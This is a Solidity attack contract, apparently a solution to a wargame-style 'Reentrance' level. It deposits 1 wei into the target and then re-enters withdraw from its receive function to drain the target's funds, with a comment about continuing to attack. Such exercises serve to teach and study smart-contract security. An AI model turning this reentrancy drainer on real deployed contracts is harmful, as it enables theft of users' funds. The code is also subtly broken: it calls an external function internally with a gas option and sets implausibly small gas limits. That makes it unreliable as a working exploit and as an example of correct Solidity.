pragma solidity ^0.6.12;

import "../levels/Reentrance.sol";

contract ReentrancyHijacker {
    Reentrance private reentrance;

    constructor(address payable _target) public {
        reentrance = Reentrance(_target);
    }

    function donate_and_attack() external payable {
        // First donate 1 wei to the target
        (bool success, ) = address(reentrance).call{
            value: 1
        }(abi.encodeWithSignature("donate(address)", address(this)));
        
        // Then trigger reentrancy with withdrawal
        (success, ) = address(reentrance).call{
            gas: 50000
        }(abi.encodeWithSignature("withdraw(uint256)", 1));
    }

    // Reentrancy attack through receive function
    receive() external payable {
        // Reentrancy will continue while there are funds
        if (address(reentrance).balance >= 1 && reentrance.balanceOf(address(this)) >= 1) {
            (bool success, ) = address(reentrance).call{
                gas: 10000
            }(abi.encodeWithSignature("withdraw(uint256)", 1));
            
            // No need to check success as we want to keep attacking
            if (success) {
                donate_and_attack{
                    gas: 5000
                }();
            }
        }
    }
}